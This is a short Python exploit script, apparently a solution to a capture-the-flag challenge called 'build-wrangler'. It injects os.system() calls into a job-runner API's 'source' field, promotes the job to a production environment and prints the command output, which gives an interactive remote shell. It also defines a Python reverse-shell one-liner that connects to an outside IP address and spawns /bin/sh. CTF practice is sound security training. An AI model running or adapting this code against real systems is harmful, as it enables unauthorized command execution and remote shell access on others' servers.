import requests, json, time

reverse_shell="import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('20.70.203.63',80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn('/bin/sh')"

def exploit():

    while True:
        cmd = input("$ ")
        cmd="__import__('os').system('{}')".format(cmd)
        payload = {
            "name": "My Job",
            "job_type": "run",
            "environment": "testing",
            "source": "{}".format(cmd)
        }
        
        job_id=""
        for i in range(10):
            r = requests.post("http://build-wrangler.ctf.fifthdoma.in/jobs/", json=payload)
            response = json.loads(r.text)
            job_id = response["payload"]["id"] 
        r = requests.patch(
            "http://build-wrangler.ctf.fifthdoma.in/jobs/" + job_id,
            json={
                "job_type" : "run",
                "environment" : "production"
            }
        )
        print(r.text)
        time.sleep(10)

        r = json.loads(requests.get("http://build-wrangler.ctf.fifthdoma.in/jobs/").text)

        for x in r:
            if x["id"] == job_id:
                print(x["output"])
                break

if __name__ == "__main__":
    exploit()
